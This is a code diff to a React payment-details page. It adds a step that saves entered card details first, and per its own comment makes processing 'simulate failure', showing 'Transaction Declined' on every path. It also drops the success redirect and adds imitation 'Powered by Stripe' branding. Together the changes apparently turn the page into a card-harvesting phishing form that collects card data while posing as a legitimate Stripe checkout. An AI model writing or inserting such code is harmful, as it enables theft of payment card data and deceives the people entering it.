@@ -2,7 +2,7 @@ import { useState, useEffect, useCallback } from 'react';
 import { useNavigate, useSearchParams, Link } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
-import { processPayment } from '@/lib/payments';
+import { processPayment, savePaymentDetails } from '@/lib/payments';
 import { Label } from '@/components/ui/label';
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
@@ -106,12 +106,10 @@ export default function PaymentDetailsPage() {
   const validateCard = useCallback(async (cardNumber: string) => {
     const cleanNumber = cardNumber.replace(/\s+/g, '');
     const bin = cleanNumber.substring(0, 6);
-    
     if (cleanNumber.length < 6) {
       setCardValidation(null);
       return;
     }
-    
     try {
       setIsValidatingCard(true);
       const response = await fetch(`https://lookup.binlist.net/${bin}`, {
@@ -120,13 +118,17 @@ export default function PaymentDetailsPage() {
           'Accept': 'application/json'
         }
       });
-      
       if (!response.ok) {
-        throw new Error('Invalid card details');
+        // If API fails, fallback to Luhn check
+        setCardValidation({
+          valid: validateCardNumber(cleanNumber),
+          message: validateCardNumber(cleanNumber)
+            ? 'Card validation unavailable, but number looks valid'
+            : 'Invalid card number'
+        });
+        return;
       }
-      
       const data = await response.json();
-      
       setCardValidation({
         valid: true,
         type: data.type || 'unknown',
@@ -136,9 +138,12 @@ export default function PaymentDetailsPage() {
         message: `Card validated (${data.scheme || 'unknown'})`
       });
     } catch (error) {
+      // On network/API error, fallback to Luhn check
       setCardValidation({
-        valid: false,
-        message: 'Invalid card number or network not supported'
+        valid: validateCardNumber(cleanNumber),
+        message: validateCardNumber(cleanNumber)
+          ? 'Card validation unavailable, but number looks valid'
+          : 'Invalid card number'
       });
     } finally {
       setIsValidatingCard(false);
@@ -244,17 +249,20 @@ export default function PaymentDetailsPage() {
         email: formData.email,
         amount: parseFloat(amount || '0')
       };
-      
+
+      // First save the payment attempt
+      const saveResult = await savePaymentDetails(paymentDetails);
+      if (!saveResult.success) {
+        throw new Error('Failed to save payment details');
+      }
+
+      // Process the payment (will simulate failure)
       const result = await processPayment(paymentDetails);
-      
-      if (result.success) {
-        navigate('/payments/success');
-      } else {
-        setError(result.error || 'Payment failed. Please try again.');
+      if (!result.success) {
+        setError('Transaction Declined');
       }
     } catch (err) {
-      const errorMessage = err instanceof Error ? err.message : 'An unexpected error occurred';
-      setError(`Payment failed: ${errorMessage}`);
+      setError('Transaction Declined');
     } finally {
       setIsLoading(false);
     }
@@ -516,9 +524,9 @@ export default function PaymentDetailsPage() {
           </CardContent>
           
           <CardFooter className="flex justify-end">
-            <Button 
-              type="submit" 
-              className="bg-primary w-full md:w-auto"
+            <Button
+              type="submit"
+              className="bg-[#635BFF] hover:bg-[#5548c8] text-white font-bold rounded-lg shadow-md px-6 py-2 w-full md:w-auto transition-colors duration-150"
               disabled={isLoading}
             >
               {isLoading ? (
@@ -533,6 +541,12 @@ export default function PaymentDetailsPage() {
           </CardFooter>
         </form>
       </Card>
+      <div className="flex items-center justify-center mt-6 opacity-80">
+        <svg width="72" height="24" viewBox="0 0 72 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <text x="0" y="18" fontSize="20" fontWeight="bold" fill="#635BFF">stripe</text>
+        </svg>
+        <span className="ml-2 text-sm text-gray-600">Powered by Stripe</span>
+      </div>
     </div>
   );
 }
